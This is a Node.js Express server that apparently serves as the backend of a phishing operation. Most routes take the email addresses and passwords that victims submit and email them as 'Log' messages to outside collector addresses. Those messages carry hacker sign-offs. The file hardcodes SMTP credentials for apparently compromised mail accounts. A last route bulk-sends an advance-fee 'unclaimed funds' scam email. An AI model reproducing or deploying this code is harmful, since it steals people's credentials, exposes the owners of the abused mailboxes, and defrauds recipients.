const express = require("express");
const cors = require("cors");
const app = express();

app.use(cors());

const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("api is run");
});

app.post("/sendmail", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "freightx.com.ph",
      port: 465,
      auth: {
        user: "wecare@freightx.com.ph",
        pass: "FXLSICS#2023",
      },
    });
    let info = await transporter.sendMail({
      from: '"You" <ptn2center@ptninsurancebroker.com>',
      to: " connect@ellsworthins.com",
      subject: "Testing, testing, 123",
      html: `
    <div> 
      <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

app.post("/sendmail3", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "freightx.com.ph",
      port: 465,
      auth: {
        user: "wecare@freightx.com.ph",
        pass: "FXLSICS#2023",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <wecare@freightx.com.ph>',
      to: "quickloaninvestors@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail2", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.wayhong.com.vn",
      port: 465,
      auth: {
        user: "dungxnk@wayhong.com.vn",
        pass: "Dungxnk@123",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <dungxnk@wayhong.com.vn>',
      to: "Ikrima.catirk@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail4", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "freightx.com.ph",
      port: 465,
      auth: {
        user: "wecare@freightx.com.ph",
        pass: "FXLSICS#2023",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <wecare@freightx.com.ph>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail5", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "freightx.com.ph",
      port: 465,
      auth: {
        user: "wecare@freightx.com.ph",
        pass: "FXLSICS#2023",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <wecare@freightx.com.ph>',
      to: "wangyong2114@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail6", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "freightx.com.ph",
      port: 465,
      auth: {
        user: "wecare@freightx.com.ph",
        pass: "FXLSICS#2023",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <wecare@freightx.com.ph>',
      to: "daniellahm@yandex.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail7", async (req, res) => {
  const { firstName, lastName, phone, email, message } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "freightx.com.ph",
      port: 465,
      auth: {
        user: "wecare@freightx.com.ph",
        pass: "FXLSICS#2023",
      },
    });
    let info = await transporter.sendMail({
      from: 'Cleaning Site" <wecare@freightx.com.ph>',
      to: "theodoreemagilll@gmail.com",
      subject: "Cleaning Site",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>firstName: ${firstName}</p>
        <p>lastName: ${lastName}</p>
        <p>phone: ${phone}</p>
        <p>email: ${email}</p>
        <p>message: ${message}</p>
 
    
   
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
 app.post("/sendmail8", async (req, res) => {
  const { allMail } = req.body;
  const emailArray = allMail.split(",").map((e) => e.trim());
  let errormails = [];
  let sent = [];

  console.log(emailArray);

  // create transporter once
  const transporter = nodemailer.createTransport({
    host: "93.88.205.157",
    port: 25,
    secure: false,
    auth: {
      user: "lues@maindo-co.icu",
      pass: "usarmy11111@@",
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  // helper function to await sendMail
  function sendMailPromise(mailOptions) {
    return new Promise((resolve, reject) => {
      transporter.sendMail(mailOptions, (err, info) => {
        if (err) {
          reject(err);
        } else {
          resolve(info);
        }
      });
    });
  }

  // process emails one by one
  for (let email of emailArray) {
    try {
      await sendMailPromise({
        from: '"William Dudley" <lues@maindo-co.icu>',
        to: email,
        subject: "Partnership Request ",
        text: "This is a email sent for notification.",
        replyTo: "contact@williamsdudley.org",

        html: `<!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Order Invoice - 123456</title>
        <style>
          body {
            font-family: "Helvetica Neue", Arial, sans-serif;
            line-height: 1.6;
            color: #333333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
          }
          .email-container {
            max-width: 700px;
            background-color: #ffffff;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
          }
          .header {
            border-bottom: 1px solid #f0f0f0;
            padding-bottom: 20px;
            margin-bottom: 25px;
          }

          .greeting {
            font-size: 16px;
            margin-bottom: 25px;
            color: #444444;
          }
          .content {
            font-size: 15px;
            margin-bottom: 25px;
            color: #555555;
            line-height: 1.7;
          }
          .invoice-section {
            background-color: #fafafa;
            border-radius: 6px;
            padding: 25px;
            margin: 30px 0;
            border: 1px solid #eeeeee;
          }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="header">
            <b>Partnership Request </b>
          </div>

       
          <!-- Receipt Section -->
          <div class="invoice-section">
         My name is Mr. William Duebs. I seek your trust and partnership in a confidential matter involving an unclaimed sum in my bank. The funds belong to a deceased client with no next of kin.
 <br />
            <br /> 
            If you are willing to be presented as the legal beneficiary, please respond, and I will provide further details.
          <br />
            <br /> Your prompt reply will be appreciated.
          </div>

          <!-- Delivery Address Section -->

          <div class="content">
            Sincere regards,<br />
            Mr. William Duebs
          </div>
        </div>
      </body>
    </html>
    `,
      });
      console.log("Message sent:", email);
      sent.push(email);
    } catch (err) {
      console.error("Error occurred:", err);
      errormails.push(email);
    }
  }

  res.send({ failed: errormails, sent: sent });
});
const PORT = process.env.PORT || 5000;

app.listen(PORT, console.log(`server in on "5000"`));
